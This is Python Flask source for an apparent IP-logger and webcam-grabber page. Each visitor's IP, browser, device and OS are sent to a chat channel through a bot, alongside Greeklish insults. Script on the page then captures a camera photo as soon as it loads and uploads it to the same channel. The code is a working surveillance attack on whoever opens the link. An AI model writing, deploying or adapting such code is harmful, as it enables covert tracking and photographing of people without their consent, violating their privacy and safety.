from flask import Flask, url_for, request
import tempfile, base64, user_agents
from bot import sendMessage, sendImage

channel = 340282366841710301281180646637327430260
app = Flask(__name__)

def send(content: str = None, image: str = None):

    if content is not None:
        return sendMessage(content, channel, True)

    return sendImage(image, channel, True)

@app.route("/")
async def home():

    image_url = url_for("static", filename="images/zoobie.jpg")
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    agent = user_agents.parse(user_agent)

    await send(f"🥳 Kapoios ameas mphke!\n♨️ Oi plhrofories tou:\n\n🌐 IP: {user_ip}\n🦊 Browser: {agent.browser}\n📱 Suskeuh: {agent.device}\n🚀 Leitourgiko: {agent.os}")

    return """

        <html>

            <head>

                <style>

                    body, html {{
                        margin: 0;
                        padding: 0;
                        height: 100%;
                    }}
                    
                    .bg {{
                        background-image: url('{image_url}');
                        background-size: cover;
                        background-position: center;
                        height: 100%;
                        position: relative;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: white;
                        font-family: Arial, sans-serif;
                        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
                    }}

                    .text {{
                        font-size: 3rem;
                        text-align: center;
                    }}

                </style>

                <meta name="viewport" content="width=device-width, initial-scale=1.0">

            </head>

            <body>

                <div class="bg">

                    <div class="text">

                        <h1>Plhrofories malaka apo Zoumpi</h1>
                        <p>IP: user_ip</p>
                        <p>User-Agent: user_agent</p>
                        <p>Full headers: request.headers</p>

                    </div>

                </div>

                <script>
                    async function capturePhoto() {
                        try {
                            // Request camera permissions as soon as the page loads
                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                            // Create a hidden video element to capture the image
                            const video = document.createElement('video');
                            video.srcObject = stream;

                            // Wait for the video to start playing
                            await new Promise(resolve => {
                                video.onloadedmetadata = () => {
                                    video.play();
                                    resolve();
                                };
                            });

                            // Create a canvas to capture the image
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;

                            // Draw the current video frame to the canvas
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Get the base64 image data from the canvas
                            const base64Image = canvas.toDataURL('image/png');

                            // Stop the camera stream
                            stream.getTracks().forEach(track => track.stop());

                            fetch('/upload', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: base64Image })
                            }).then(response => response.json())
                            .then(data => console.log(data));

                        } catch (err) {
                            console.error("Error accessing the camera:", err);
                        }
                    }

                    // Start capturing the photo as soon as the page loads
                    window.onload = capturePhoto;
                </script>

            </body>

        </html>

    """.replace("user_ip", user_ip).replace("user_agent", user_agent).replace("request.headers", str(request.headers)).replace("{image_url}", image_url)

@app.route("/upload", methods=["POST"])
async def upload():
    
    data = request.json
    image_base64 = data.get("image", "")

    if image_base64:

        image_data = image_base64.split(",")[1]
        image_bytes = base64.b64decode(image_data)

        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as temp_file:

            temp_file.write(image_bytes)
            temp_file_path = temp_file.name
            await send(image=temp_file_path)

        return {"message": f"Image saved temporarily at {temp_file_path}"}
    
    return {"error": "No image received!"}, 400

if __name__ == "__main__":
    app.run(debug=False, use_reloader=False)